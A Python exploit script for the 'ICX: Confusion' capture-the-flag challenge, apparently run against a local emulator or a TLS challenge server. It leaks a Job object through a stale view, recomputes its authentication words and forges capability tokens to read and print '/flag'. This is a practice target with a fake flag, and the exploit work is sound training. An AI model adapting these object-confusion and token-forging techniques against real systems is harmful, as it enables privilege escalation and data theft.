#!/usr/bin/env python3
"""Exploit ICX: Confusion locally or against the TLS challenge service."""
import os, re, select, socket, ssl, subprocess, sys, time

MASK = (1 << 23) - 1

def rol23(x, n):
    n %= 23
    x &= MASK
    return ((x << n) | (x >> (23 - n))) & MASK if n else x

def job_auth(slot, generation, d):
    """Recreate Job words 6 and 7 after changing its manifest/seal."""
    s1 = rol23(d[4] ^ 0x6A19D3 ^ slot, 3)
    s2 = rol23(d[5] ^ 0x14F2B7 ^ generation, 17)
    for i, v in enumerate(d[:6]):
        t = rol23(v ^ (((i + 1) * 0x1F123) & MASK),
                  ((i * 3 + 1) % 22) + 1)
        s1 = rol23(((((s1 + t) & MASK) * 0x6C8E9D) & MASK)
                   ^ s2 ^ ((i * 0x231) & MASK), 5)
        s2 = rol23(((((s2 ^ t) * 0x2D1F3B) & MASK)
                   + s1 + (i + 1) * 0x711) & MASK, 13)
    return s1, s2

class LocalTube:
    def __init__(self):
        env = dict(os.environ, FLAG='pwnsec{this_is_fake_flag}')
        self.p = subprocess.Popen(['./extracted/icx-emu'], stdin=subprocess.PIPE,
                                  stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                  bufsize=0, env=env)
    def sendline(self, s):
        if isinstance(s, str): s = s.encode()
        self.p.stdin.write(s + b'\n'); self.p.stdin.flush()
    def recvuntil(self, marker=b'> ', timeout=60):
        out = b''; end = time.time() + timeout
        while marker not in out and time.time() < end:
            r, _, _ = select.select([self.p.stdout], [], [], 0.25)
            if r:
                q = os.read(self.p.stdout.fileno(), 65536)
                if not q: break
                out += q
        return out
    def close(self): self.p.kill()

class RemoteTube:
    def __init__(self, host, port):
        raw = socket.create_connection((host, port), timeout=20)
        self.s = ssl.create_default_context().wrap_socket(raw, server_hostname=host)
    def sendline(self, s):
        if isinstance(s, str): s = s.encode()
        self.s.sendall(s + b'\n')
    def recvuntil(self, marker=b'> ', timeout=60):
        out = b''; end = time.time() + timeout
        while marker not in out and time.time() < end:
            self.s.settimeout(max(0.1, end - time.time()))
            try: q = self.s.recv(65536)
            except socket.timeout: break
            if not q: break
            out += q
        return out
    def close(self): self.s.close()

def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        host = sys.argv[2] if len(sys.argv) > 2 else 'CHALLENGE_HOST'
        return RemoteTube(host, 443)
    return LocalTube()

io = start()

def cmd(s, timeout=20):
    io.sendline(s)
    r = io.recvuntil(b'> ', timeout=timeout)
    if os.environ.get('DEBUG'): sys.stderr.buffer.write(r)
    return r

banner = io.recvuntil(b'> ', timeout=70)
if b'> ' not in banner:
    io.close()
    raise SystemExit('service closed before the ICX prompt (wrong or expired endpoint)'
                     + (': ' + repr(banner[:240]) if banner else ''))

# Fixed allocator order gives these slots and object-buffer addresses:
#   1 carrier, 2 request, 3 path, 4 destination, 5/6 stale Views.
cmd('new 41')                         # slot 1: becomes Job
cmd('new 42')                         # slot 2: request fields
cmd('new 2f666c6167')                 # slot 3: "/flag"
cmd('new 00')                         # slot 4: output storage
cmd('view 1')                         # slot 5: stale Job view
cmd('view 2')                         # slot 6: request-field view
cmd('pack 1 2')

m = re.search(rb'DATA\s+((?:[0-9a-fA-F]{6}\s*){8})', cmd('peek 5'))
if not m:
    raise SystemExit('could not leak Job')
d = [int(x, 16) for x in m.group(1).split()]

job_slot = 1
generation = d[2]
# run computes token = job[0] XOR rol23((job[4] XOR slot*757)+job[5]+gen,9)
seal = rol23(((d[4] ^ (job_slot * 0x2F5)) + d[5] + generation) & MASK, 9)

def edit(view, index, value):
    cmd(f'edit {view} {index} {value & MASK:06x}')

def forge(token, version, count):
    d[0] = token ^ seal
    d[3] = version | (count << 5)
    d[6], d[7] = job_auth(job_slot, generation, d)
    for i in (0, 3, 6, 7):
        edit(5, i, d[i])

# The confused manifest makes run copy request[1..5] into its IPC descriptor.
# 0x7cebed is the inherited read-gate capability from security.policy.
path = 0x110461                       # slot 3 object data
dst  = 0x110481                       # slot 4 object data
for i, v in enumerate((path, 5, dst, 160, 0), 1):
    edit(6, i, v)
forge(0x7CEBED, version=1, count=5)
r = cmd('run 1', timeout=30)
if b'completed the request' not in r:
    raise SystemExit('flag read gate rejected the request')

# Reuse the legitimate console-write gate to emit the destination buffer.
edit(6, 1, dst)
edit(6, 2, 160)
forge(0x033E63, version=1, count=2)
r = cmd('run 1', timeout=30)
m = re.search(rb'pwnsec\{[^}\r\n\x00]*\}', r)
if not m:
    raise SystemExit('flag was not present in the returned data: ' + repr(r[:240]))
print(m.group().decode())
io.close()
